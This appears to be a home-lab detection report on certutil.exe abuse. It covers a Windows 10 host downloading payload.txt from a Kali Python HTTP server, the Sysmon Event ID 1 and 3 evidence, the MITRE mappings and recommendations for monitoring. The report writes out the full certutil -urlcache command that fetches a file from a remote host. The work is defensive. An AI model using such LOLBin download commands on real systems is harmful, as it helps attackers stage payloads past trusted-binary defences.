# Investigation Report

## Summary

File download activity using `certutil.exe` was detected on the Windows 10 host. The victim machine established a network connection to the Kali Linux machine and retrieved a file hosted on a Python HTTP server.

## Timeline

1. Kali Linux hosted a file using Python HTTP Server.
2. The Windows host executed certutil.exe.
3. The file was downloaded from the remote server.
4. Sysmon generated Event ID 1 and Event ID 3.
5. Winlogbeat forwarded the logs to Elasticsearch.
6. Kibana was used to investigate the activity.

## Source IP

192.168.56.103

## Destination IP

192.168.56.102

## Hostname

WINDOWS10

## User

vboxuser

## Process Name

certutil.exe

## Command Line

```cmd
certutil.exe -urlcache -split -f http://192.168.56.102:8000/payload.txt C:\Temp\payload.txt
```

## Evidence

### Sysmon Event ID 1

Process Creation

### Sysmon Event ID 3

Network Connection

## Findings

The observed activity is consistent with LOLBin abuse and ingress tool transfer behavior. Similar techniques are commonly used by malware to retrieve payloads from remote hosts while leveraging trusted Windows binaries.

## MITRE ATT&CK

* T1218 - System Binary Proxy Execution
* T1105 - Ingress Tool Transfer

## Severity

Medium

## Recommendations

* Monitor certutil.exe execution.
* Alert on the use of the -urlcache parameter.
* Investigate outbound connections initiated by LOLBins.
* Correlate file downloads with process creation events.
* Restrict unnecessary use of built-in utilities.
